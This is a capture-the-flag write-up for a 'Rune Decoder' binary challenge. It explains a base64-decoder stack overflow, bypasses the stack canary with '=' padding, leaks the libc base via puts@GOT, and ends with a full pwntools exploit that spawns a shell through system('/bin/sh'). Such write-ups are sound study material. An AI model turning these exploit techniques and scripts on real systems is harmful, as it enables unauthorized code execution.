# Rune Decoder

## TLDR
- buffer overflow
- omit canary with '=' bytes
- leak libc base with puts and GOT 
- restart challenge with _start
- execute system('/bin/sh')

# Binary check
```console
$ file rune_decoder
    rune_decoder: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1296660a363d4c4f2cfaa1768c2b0641992a64d0, for GNU/Linux 3.2.0, not stripped
```

```console
$ pwn checksec rune_decoder
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

```console
$ ./rune_decoder 
    The ancient wizards used magical runes to encode their spells, protecting their secrets from outsiders.
    These runes are based on a mystical system REALLY similar to Base64 encoding.
    Here you can use one of the runes to decode spells.
    Encoded spell: 
    dGVzdF9zdHJpbmc=
    decoding string: dGVzdF9zdHJpbmc=
    Decoded: test_string
    Okay bye!
```

As we can see, the program is a simple decoder, that decodes user given base64 string and prints it to us.

Decompilation of `main` function in Ghidra:
```c
undefined8 main(void)
{
  long in_FS_OFFSET;
  undefined local_198 [256];
  undefined local_98 [136];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setup();
  memset(local_198,0,0x100);
  puts(
      "The ancient wizards used magical runes to encode their spells, protecting their secrets from outsiders."
      );
  puts("These runes are based on a mystical system REALLY similar to Base64 encoding.");
  puts("Here you can use one of the runes to decode spells.");
  read_base64(local_198);
  b64decode(local_198,local_98);
  printf("Decoded: %s",local_98);
  puts("\nOkay bye!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

Program reads our base64 input to buffer at local_198 and then calls function `b64decode` with buffers local_198 and local_98 as arguments.

Decompilation of `b64decode`:

```c
void b64decode(char *param_1,long param_2)
{
  size_t sVar1;
  int local_14;
  int local_10;
  
  sVar1 = strlen(param_1);
  write(1,"decoding string: ",0x11);
  write(1,param_1,(long)(int)sVar1);
  puts("");
  if ((sVar1 & 3) != 0) {
    puts("invalid size");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  local_10 = 0;
  for (local_14 = 0; local_14 < (int)sVar1; local_14 = local_14 + 4) {
    decode4bytes(param_1 + local_14,local_10 + param_2);
    local_10 = local_10 + 3;
  }
  return;
}
```

and `decode4bytes`:

```c

void decode4bytes(char *param_1,byte *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  byte local_1b;
  byte local_1a;
  byte local_19;
  
  iVar1 = letter2value((int)*param_1);
  iVar2 = letter2value((int)param_1[1]);
  iVar3 = letter2value((int)param_1[2]);
  iVar4 = letter2value((int)param_1[3]);
  local_1b = 0;
  local_1a = 0;
  local_19 = 0;
  if (iVar1 != -1) {
    local_1b = (byte)(iVar1 << 2);
  }
  if (iVar2 != -1) {
    local_1b = local_1b | (byte)(iVar2 >> 4);
    local_1a = (byte)(iVar2 << 4);
  }
  if (iVar3 != -1) {
    local_1a = local_1a | (byte)(iVar3 >> 2);
    local_19 = (byte)(iVar3 << 6);
  }
  if (iVar4 != -1) {
    local_19 = local_19 | (byte)iVar4;
  }
  if ((iVar1 != -1) && (iVar2 != -1)) {
    *param_2 = local_1b;
  }
  if ((iVar2 != -1) && (iVar3 != -1)) {
    param_2[1] = local_1a;
  }
  if ((iVar3 != -1) && (iVar4 != -1)) {
    param_2[2] = local_19;
  }
  return;
}
```

From this functions we can see that program decodes 4 bytes at the time from first buffer and writes 3 bytes to second buffer (base64 decoding has a decoding ratio 4:3). 

Now let's recall sizes of buffers. 
- first buffer has size 256 bytes
- second buffer has size 136 bytes (in reality 128 bytes)

If we do calculations, we can see that there is 64 bytes long buffer overflow. This should be enough to overwrite function return address.

There is one problem, because there is canary present on stack. So is it the end of our exploitation? Function `decode4bytes` writes to second buffer only if values are not equal to -1. Value -1 is returned by function `letter2value` if base64 letter is equal to `=` (padding). There is also no check if padding is at the end of our message.

So if our program doesn't write anything to buffer when letter is `=` and doesn't check boundries, we can specify `=======` in the middle of our payload to omit canary. 

We can check our understanding in gdb. We need to encode 128 fill bytes then add some `=====` padding and finally some more encoded random bytes

![alt text](image-2.png)

As we can see, there are bytes `B` after rbp and so we managed to omit canary.

![alt text](image-1.png)

From here we should have ~40 bytes that overflow return address so we can rop. 

The easiest way to get a shell is to call system('/bin/sh'), but we need libc leak first to calculate base. We can leak puts@got address using puts itself. We have to call puts@plt with puts@got as argument. This can be done, because we have `pop rdi; ret` gadget in binary.

```console
$ ropper -f rune_decoder --search "pop rdi"
    [INFO] Load gadgets for section: LOAD
    [LOAD] loading... 100%
    [LOAD] removing double gadgets... 100%
    [INFO] Searching for gadgets: pop rdi

    [INFO] File: rune_decoder
    0x000000000040147d: pop rdi; ret;
``` 

We can leak puts address and calculate libc base using script like this. Note that you need to add some bytes `AA` to the beginning of ropchain to 8-byte align it.

```py
fill = b'A'*128

POP_RDI = next(elf.search(asm("pop rdi; ret"), executable=True))
RET = next(elf.search(asm("ret"), executable=True))

ropchain = flat(
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['_start']
)

payload = base64.b64encode(fill)
payload += b'===='*7
payload += base64.b64encode(b'AA'+ropchain)

io.clean()
io.sendline(payload)
io.recvuntil(b'bye')
io.recvline()

puts_leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')
```

Note that we restart challenge using `_start` function so that we can read new payload, now with leaked libc base.

In next iteration, we can simply make ropchain to execute `system('/bin/sh')`

```py
BINSH = next(libc.search(b'/bin/sh\x00'))

ropchain2 = flat(
    POP_RDI,
    BINSH,
    RET,
    libc.sym['system']
)

payload = base64.b64encode(fill)
payload += b'===='*7
payload += base64.b64encode(b'AA'+ropchain2)

io.sendline(payload)

io.interactive()
```

After this we get a shell and we can read flag.

## Final exploit

```py
#!/usr/bin/env python
from pwn import *

##### SPECIFY BINARY #####
elf = context.binary = ELF('rune_decoder')
# libc = ELF('lib/libc.so.6')
libc = elf.libc

context.terminal = ['gnome-terminal', '--tab', '--']

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        ##### SPECIFY SERVER AND PORT #####
        SERVER = 'localhost'
        PORT = 13373
        return remote(SERVER, PORT, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

import base64

io = start()

fill = b'A'*128

POP_RDI = next(elf.search(asm("pop rdi; ret"), executable=True))
RET = next(elf.search(asm("ret"), executable=True))

ropchain = flat(
    POP_RDI,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['_start']
)

payload = base64.b64encode(fill)
payload += b'===='*7
payload += base64.b64encode(b'AA'+ropchain)

io.clean()
io.sendline(payload)
io.recvuntil(b'bye')
io.recvline()

puts_leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = puts_leak - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

BINSH = next(libc.search(b'/bin/sh\x00'))

ropchain2 = flat(
    POP_RDI,
    BINSH,
    RET,
    libc.sym['system']
)

payload = base64.b64encode(fill)
payload += b'===='*7
payload += base64.b64encode(b'AA'+ropchain2)

io.sendline(payload)

io.interactive()
```